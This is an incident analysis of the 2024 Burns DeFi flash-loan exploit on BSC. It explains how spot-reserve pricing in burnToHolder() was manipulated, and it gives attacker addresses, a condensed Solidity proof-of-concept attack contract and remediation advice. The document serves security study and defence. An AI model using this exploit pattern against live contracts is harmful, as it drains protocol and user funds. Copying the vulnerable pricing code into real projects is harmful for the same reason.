# Burns DeFi — Flash Loan-Based burnToHolder Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02-12 |
| **Protocol** | Burns DeFi (BurnsBuild) |
| **Chain** | BSC |
| **Loss** | ~$67,000 |
| **Attacker** | [0xC9FBCf3E](https://bscscan.com/address/0xC9FBCf3EB24385491f73BbF691b13A6f8Be7C339) |
| **Attack Contract** | [0xb5eebf73](https://bscscan.com/address/0xb5eebf73448e22ce6a556f848360057f6aadd4e7) |
| **Vulnerable Contract** | [BurnsBuild 0x4fb9657A](https://bscscan.com/address/0x4fb9657Ac5d311dD54B37A75cFB873b127Eb21FD) |
| **Root Cause** | The `burnToHolder()` function uses a spot reserve-based price from DEX pair `getReserves()`, allowing reserve manipulation within a single block to receive excess reward tokens |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/BurnsDefi_exp.sol) |

---

## 1. Vulnerability Overview

Burns DeFi's `burnToHolder()` function calculates the Burns token price using the spot reserves of a PancakeSwap pair to distribute rewards. The attacker used a 250,000 BUSDT flash loan to execute a WBNB→Burns swap to manipulate the price, then called `burnToHolder()` twice and collected excessive rewards via `receiveRewards()`.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: reward calculation based on pair spot price
function burnToHolder(uint256 amount, address holder) external {
    (uint112 r0, uint112 r1,) = pair.getReserves();
    // Spot reserve-based price calculation — manipulable via flash loan
    uint256 burnPrice = uint256(r0) * 1e18 / uint256(r1);
    uint256 reward = amount * burnPrice / 1e18;
    pendingRewards[holder] += reward;
}

// ✅ Safe code: use TWAP-based price
function burnToHolder(uint256 amount, address holder) external {
    uint256 burnPrice = getTWAPPrice(1800); // 30-minute TWAP
    uint256 reward = amount * burnPrice / 1e18;
    pendingRewards[holder] += reward;
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: BurnsDefi_decompiled.sol
contract BurnsDefi {
    function burnToHolder(uint256 p0, address p1) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] flash: 250,000 BUSDT flash loan
  │
  ├─→ [2] BUSDT → WBNB → Burns swap (price manipulation)
  │
  ├─→ [3] burnToHolder(large amount) called 2x
  │         └─ rewards accumulate at manipulated spot price
  │
  ├─→ [4] receiveRewards() called → excessive rewards collected
  │
  ├─→ [5] WBNB → BUSDT reverse swap
  │   └─→ Burns → BUSDT swap
  │
  └─→ [6] Flash loan repaid + ~$67K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IBurnsBuild {
    function burnToHolder(uint256 amount, address holder) external;
    function receiveRewards(address holder) external;
}

contract AttackContract {
    IBurnsBuild constant burns = IBurnsBuild(0x4fb9657Ac5d311dD54B37A75cFB873b127Eb21FD);
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
        // [1] BUSDT → WBNB → Burns swap (price manipulation)
        swapBUSDTToWBNBToBurns(250_000e18);

        // [2] burnToHolder called 2x (rewards accumulate at manipulated price)
        burns.burnToHolder(burnsBalance / 2, address(this));
        burns.burnToHolder(burnsBalance / 2, address(this));

        // [3] Collect rewards
        burns.receiveRewards(address(this));

        // [4] Burns/WBNB → BUSDT reverse swap
        swapBurnsToWBNBToBUSDT(burns.balanceOf(address(this)));
        swapWBNBToBUSDT(WBNB.balanceOf(address(this)));

        // [5] Repay flash loan
        BUSDT.transfer(msg.sender, 250_000e18 + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Flash loan-based price manipulation |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **Attack Vector** | External (flash loan exploitation) |
| **DApp Category** | Reward token / DeFi protocol |
| **Impact** | Reward pool fund drainage |

## 6. Remediation Recommendations

1. **Apply TWAP Oracle**: Change the price calculation inside `burnToHolder()` to use a 30-minute TWAP
2. **Price Deviation Guard**: Block reward calculation if the current spot price deviates more than 5% from the TWAP
3. **Maximum Reward Cap**: Set an upper limit on the maximum reward claimable per single call
4. **Delayed Reward Distribution**: Replace immediate payouts with a claim-after-N-blocks mechanism

## 7. Lessons Learned

- Reward calculations that directly depend on DEX spot prices — like `burnToHolder()` — become prime targets for flash loan attacks.
- The pattern of manipulating prices via flash loans to claim excess rewards recurs repeatedly on BSC.
- Even small flash loans can cause significant damage when combined with reward calculation functions.